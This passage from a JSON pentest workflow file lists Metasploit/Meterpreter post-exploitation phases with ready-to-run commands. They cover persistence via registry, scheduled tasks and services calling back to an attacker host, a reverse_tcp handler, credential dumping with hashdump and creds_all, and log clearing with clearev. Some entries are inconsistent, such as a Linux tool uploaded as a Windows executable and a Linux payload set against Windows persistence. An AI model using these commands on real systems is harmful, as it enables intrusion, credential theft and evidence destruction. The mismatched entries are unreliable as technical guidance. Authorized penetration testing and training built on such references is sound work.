              "id": "meterpreter-ipconfig",
              "shows": "See command documentation"
            },
            {
              "id": "meterpreter-route-add",
              "example": "run autoroute -s 172.16.5.0/24",
              "shows": "Route added successfully"
            }
          ]
        },
        {
          "title": "Phase 5: Persistence Installation (Long-Term Access)",
          "notes": "Install multiple persistence methods for redundancy. Registry: run persistence -X -i 60 -p 443 -r <LHOST>. Scheduled task: run schtasks -X -i 120 -p 4444 -r <LHOST>. Service: upload payload, create service with sc create. Set up background handler: use exploit/multi/handler; set ExitOnSession false; exploit -j -z. Test callbacks after reboot (optional). Document persistence locations for cleanup. Estimated time: 5-10 minutes.",
          "commands": [
            {
              "id": "meterpreter-upload",
              "example": "upload /usr/bin/unix-privesc-check C:\\Temp\\privesc.exe",
              "shows": "Uploading: <file>"
            },
            {
              "id": "meterpreter-shell",
              "example": "shell",
              "shows": "Process created"
            },
            {
              "id": "msf-handler-background",
              "example": "use exploit/multi/handler; set payload linux/x64/meterpreter_reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; run -j",
              "shows": "Exploit running as background job <ID>"
            }
          ]
        },
        {
          "title": "Phase 6: Post-Exploitation Documentation and Cleanup",
          "notes": "Document all findings: Credentials harvested (creds_all output), Persistence mechanisms installed (registry keys, tasks, services), Network routes established (autoroute -p), Sessions maintained (sessions -l). Cleanup before engagement end: Remove persistence (run persistence -U, sc delete <service>, schtasks /delete /tn <task>), Clear logs (clearev - only in authorized engagements), Kill sessions (sessions -K). Estimated time: 10-15 minutes for thorough cleanup.",
          "commands": [
            {
              "id": "meterpreter-hashdump",
              "example": "hashdump",
              "shows": "Username:RID:LM_hash:NTLM_hash::: format"
            },
            {
              "id": "meterpreter-kiwi-creds-all",
              "example": "creds_all",
              "shows": "Credentials table with Username, Domain, NTLM, SHA1"
            },
            {
              "id": "meterpreter-upload",
              "example": "upload /usr/bin/unix-privesc-check C:\\Temp\\privesc.exe",
              "shows": "Uploading: <file>"
            }
          ]
        }
      ],
      "tags": [
        "METASPLOIT",
        "METERPRETER",
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION",
        "CREDENTIALS",
        "PIVOTING",
        "PERSISTENCE"
      ]
    }
  ]
}